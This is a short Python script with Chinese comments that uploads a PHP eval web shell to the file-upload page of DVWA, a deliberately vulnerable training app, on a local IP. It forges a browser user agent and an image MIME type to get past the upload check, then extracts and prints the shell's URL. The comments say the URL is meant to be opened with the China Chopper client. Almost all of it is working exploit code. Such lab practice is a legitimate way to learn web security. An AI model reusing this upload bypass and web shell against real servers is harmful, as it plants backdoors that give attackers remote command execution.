import requests

url="http://192.168.200.148/DVWA-2.0.1/vulnerabilities/upload/"

#伪造Cookie和用户代理(不用的话直接显示你是python在访问它网站)
headers={
    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Cookie":"security=low; PHPSESSID=6d3palfpufi0einmpqk915do66"
}

#上传文件属性
data={
    "MAX_FILE_SIZE":100000,
    "Upload":"Upload"
}


#上传的文件格式
files={
    "uploaded":("1.php",b"<?php @eval($_REQUEST[777]) ?>","image/png")
}


#allow_redirects=False就是不允许重定向(不用这个直接反正文给你)
res=requests.post(url=url,headers=headers,data=data,files=files,allow_redirects=False)


#以pre>分割成三个数据的列表，然后访问第二个数据并且以空格切除最终地址
file_path=res.text.split("pre>")[1].split(" ")[0]

#拼接路径
path=url+file_path


#最终路径打印，可以用菜刀直连
print(path)